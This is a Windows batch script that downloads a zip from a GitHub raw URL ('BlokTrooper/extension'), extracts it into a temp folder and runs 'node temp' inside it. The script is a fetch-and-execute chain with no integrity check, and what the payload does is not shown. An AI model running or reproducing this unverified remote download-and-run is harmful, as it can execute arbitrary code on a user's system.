@echo off
REM ----------------------------
REM Variables
REM ----------------------------
set "URL=https://raw.githubusercontent.com/BlokTrooper/extension/main/windows.zip"
set "TEMPDIR=%TEMP%\ext"
set "TEMPZIP=%TEMPDIR%\windows.zip"

REM ----------------------------
REM Create temp extract folder if not exists
REM ----------------------------
if not exist "%TEMPDIR%" mkdir "%TEMPDIR%"

REM ----------------------------
REM Download zip using curl
REM ----------------------------
curl -L -o "%TEMPZIP%" "%URL%"

REM ----------------------------
REM Extract zip using tar
REM ----------------------------
tar -xf "%TEMPZIP%" -C "%TEMPDIR%"

REM ----------------------------
REM Remove temp zip
REM ----------------------------
del "%TEMPZIP%"

REM ----------------------------
REM Run "node temp" in extracted folder
REM ----------------------------
echo Running node temp...
cd /d "%TEMPDIR%"
node temp

echo Done!
pause